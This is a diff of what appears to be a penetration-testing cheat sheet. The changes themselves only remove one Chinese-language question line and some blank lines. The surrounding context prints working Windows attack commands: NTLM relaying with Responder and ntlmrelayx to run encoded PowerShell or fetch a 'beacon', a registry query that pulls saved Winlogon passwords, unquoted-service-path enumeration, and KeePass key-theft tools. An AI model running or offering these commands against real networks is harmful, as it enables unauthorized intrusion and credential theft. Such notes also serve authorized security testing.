@@ -433,7 +433,6 @@ crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt
 python Responder.py -I <interface> -r -d -w
 ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)
 
-我们如何执行命令呢？
 
 ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd
 ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP
@@ -851,8 +850,6 @@ Look for SeImpersonate, SeDebugPrivilege etc
 qwinsta
 ```
 
-
-
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 
@@ -876,8 +873,6 @@ wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>
 
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
-
-
 
 ```bash
 wmic startup get caption,command
@@ -963,8 +958,6 @@ Get-KeePassDatabaseKey -Verbose
 
 KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll & KeePatched.exe can also be used.
 ```
-
-
 
 ```bash
 https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1
